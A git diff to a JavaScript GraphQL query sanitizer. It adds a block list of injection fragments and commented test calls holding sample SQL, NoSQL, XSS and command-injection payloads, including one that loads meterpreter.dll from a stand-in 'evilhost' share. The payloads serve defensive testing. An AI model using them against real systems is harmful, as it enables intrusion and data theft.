@@ -1,30 +1,52 @@
-// init sanitizeQuery, a function that accepts 2 params input (a graphQL query) and maxDepth (the maximum query nesting depth permitted, default 10) that users will require and invoke in their applications to sanitize the passed-in query
+// init sanitizeQuery, a function that accepts 4 params input (required, a graphQL query type string), strict (a bool value, default false, that enables additional query sanitization), maxDepth (the maximum query nesting depth permitted, type integer), and maxLength (maximum permitted query length, type integer) that users will require and invoke in their applications to sanitize the passed-in query
 const sanitizeQuery = (
   input,
+  strict = false,
   maxDepth = 10,
-  maxLength = 2000,
-  strict = false
+  maxLength = 2000
 ) => {
   // check if input is more deeply nested than maxDepth
   deepLimit(input, maxDepth);
   // check if input is longer than maxLength
   lengthLimit(input, maxLength);
-  // if no error, sanitize query:
-  // whitelisting and blacklisting are options we are not currently pursuing, but could help further secure our queries
   // if function is being run on strict mode
   if (strict) {
-    // init const blackList as arr of common SQL injection attacks (strings)
-    const blackList = [
+    // allowlisting is an option we are not currently pursuing, but could help further secure our queries
+    // init const blockList as arr of potentially malicious fragments (strings)
+    const blockList = [
+      // common SQL injection fragments
       '1=1',
+      `' OR`,
       'select sqlite_version()',
       'SELECT sql FROM sqlite_schema',
       `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'`,
+      // common HTML injection fragments
+      '<script',
+      'script/>',
+      'script',
+      // dangerous characters
+      '<',
+      '>',
+      '-',
+      '/',
+      "'",
+      `{"`,
+      `"{`,
+      `}"`,
+      `*`,
+      `"}`,
+      `\\`,
+      `{\\`,
+      // log spoofing
+      `%`,
+      // PHP code insertion
+      'php',
     ];
-    // iterate through each string in blackList
-    for (const str in blackList) {
+    // iterate through each string in blockList
+    for (const str of blockList) {
       // if input (query) contains a potentially malicious fragment, throw new error
       if (input.includes(str))
-        throw new Error('potentially malicious string detected:', str);
+        throw new Error(`potentially malicious string detected:, ${str}`);
     }
   }
   // amount limiting (limiting number of times a query can be called)
@@ -44,7 +66,6 @@ const deepLimit = (input, depth) => {
     // if the element is '{' push it to the stack
     if (el === '{') stack.push(el);
   }
-  // true if the stack is empty, false if otherwise
   return input;
 };
 
@@ -53,14 +74,15 @@ const lengthLimit = (input, length) => {
   // if input length exceeds passed-in param length, throw new Error
   if (input.length > length)
     throw new Error(
-      'Mximum query length exceeded, modify query or maximum permitted query length'
+      'Maximum query length exceeded, modify query or maximum permitted query length'
     );
   // if input depth is within the permitted limits, return input
   return input;
 };
 
+// sanitizeQuery testing
 // console.log(
-//   deepLimit(
+//   sanitizeQuery(
 //     `query maliciousQuery {
 //   thread(id: "some-id") {
 //     messages(first: 99999) {
@@ -77,9 +99,142 @@ const lengthLimit = (input, length) => {
 //       }
 //     }
 //   }
-// }`
+// }`,
+//     true,
+//     2,
+//     1000
 //   )
 // );
 
-// export sanitizeQuery
-module.exports = sanitizeQuery;
+// console.log(
+//   sanitizeQuery(
+//     `query {
+//       users(search: "{\"email\": {\"$gte\": \"\"}}",
+//             options: "{\"fields\": {}}") {
+//           _id
+//           username
+//           fullname
+//           email
+//       }
+//   }`,
+//     true
+//   )
+// );
+
+// console.log(
+//   sanitizeQuery(`SELECT * from customers where id='1233' OR 1=1—'`, true)
+// );
+// console.log(
+//   sanitizeQuery(
+//     `mutation {
+//     createPaste(title:"<h1>hello!</h1><script>alert('Attack')</script>", content:"zzzz", public:true) {
+//       paste {
+//         id
+//       }
+//     }
+//    }`,
+//     true
+//   )
+// );
+
+// console.log(
+//   sanitizeQuery(
+//     `query {
+//       customer(id: "22371' OR 1=1–") {
+//         name,
+//         email,
+//         address,
+//         contact
+//       }
+//     } `,
+//     true
+//   )
+// );
+
+// console.log(
+//   sanitizeQuery(
+//     `query {
+//       users(search: "{\"username\": {\"$regex\": \"jan\"}, \"email\": {\"$regex\": \"jan\"}}",
+//             options: "{\"skip\": 0, \"limit\": 10}") {
+//           _id
+//           username
+//           fullname
+//           email
+//       }
+//   }`,
+//     true
+//   )
+// );
+
+// console.log(
+//   sanitizeQuery(
+//     `query {
+//     users(search: "{\"email\": {\"$gte\": \"\"}}",
+//     options: "{\"fields\": {}}") {
+//   _id
+//   username
+//   fullname
+//   email
+// }
+// }`,
+//     true
+//   )
+// );
+
+// console.log(
+//   sanitizeQuery(
+//     `query {
+//       user(username: "*") {
+//         name
+//         email
+//         groups
+//       }
+//     }`,
+//     true
+//   )
+// );
+
+// console.log(
+//   sanitizeQuery(
+//     `query {
+//       getUser(id: "1; ls -la") {
+//         name
+//         email
+//       }
+//     }`,
+//     true
+//   )
+// );
+// console.log(
+//   sanitizeQuery(
+//     `query {
+//       getComment(id: "1") {
+//         user
+//         comment: "<script>alert('XSS Attack')</script>"
+//       }
+//     }`,
+//     true
+//   )
+// );
+
+// console.log(
+//   sanitizeQuery(
+//     `query {
+//       getComment(id: "1") {
+//         user
+//         comment: "<script>alert('XSS Attack')</script>"
+//       }
+//     }`,
+//     true
+//   )
+// );
+
+// console.log(
+//   sanitizeQuery(
+//     `UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
+//     `,
+//     true
+//   )
+// );
+
+// module.exports = sanitizeQuery;
